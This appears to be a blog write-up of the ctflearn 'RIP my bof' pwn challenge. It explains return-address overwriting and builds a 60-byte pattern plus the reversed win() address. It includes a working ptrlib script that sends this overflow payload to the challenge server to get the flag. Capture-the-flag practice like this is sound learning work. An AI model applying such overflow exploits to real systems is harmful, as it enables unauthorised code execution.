This is a ctflearn challenge in the pwn category. It was my first rip challenge ever.

#### What is a RIP?

RIP stands for redirect instruction pointer.

**Instruction Pointer**: The instruction pointer refers to the EIP register which points to the current instruction during a program's execution by containing its memory address. By controlling the instruction pointer we can overwrite the address the program will execute and have it go to a different address.

This is the program we are given:

![/assets/images/rip-my-bof/c2.png](/assets/images/rip-my-bof/c2.png)

In this instance we would definitely want access to the `win()` function.
If we can overflow the buffer `buff` and `padding`, we can overwrite for the return address to point to the `win()` and get the flag.

This program has the following stack representation (sometimes drawn the other way around, I think it makes more sense this way):

In this diagram the "Saved Frame Pointer" is refering to `EBP`, and `ESP`. `EBP` is the stack base pointer, which is the bottom/base of the current stack frame. `ESP` is current top of the stack.  

So we need to create a payload of size 60 bytes to reach the return address to overwrite it.

When we run the program we get:

I really like the memory representation that they give.

I now need to create a buffer of exactly 60 bytes. I used the metaploit tool pattern create to do this.
```
crazyeights@es-base:~$ /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 60
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
```

Now that we have our buffer to put us in the position to overwrite the return address of `vuln()`, we need the address of `win()` to overwrite it with.
We can find this using objdump:
```
objdump -d server  | grep win
08048586 <win>:
```

We must reverse this address because values are are stored in little-endian encoding, which means the least significant byte is stored first: `\x86\x85\x04\x08`

So when we put these two together our payload is:
```python
payload = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9' + '\x86\x85\x04\x08'
```

To perform the exploit, I am using the python package ptrlib.
[ptrlib pypi](https://pypi.org/project/ptrlib/)

To exploit, we:
1. Open the socket
2. Create the payload
3. Send the payload after we recieve the `Input some text:` message
4. We loop through the response and print it.

Here is the code:
```python
from ptrlib import *

sock = Socket("thekidofarcrania.com", 4902)

payload = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9' + '\x86\x85\x04\x08'

sock.sendlineafter("Input some text:", payload)

while True:
	print(sock.recvline().decode("utf-8"))
```

Here is the output:

We now have the flag. Whoop!

FIN.
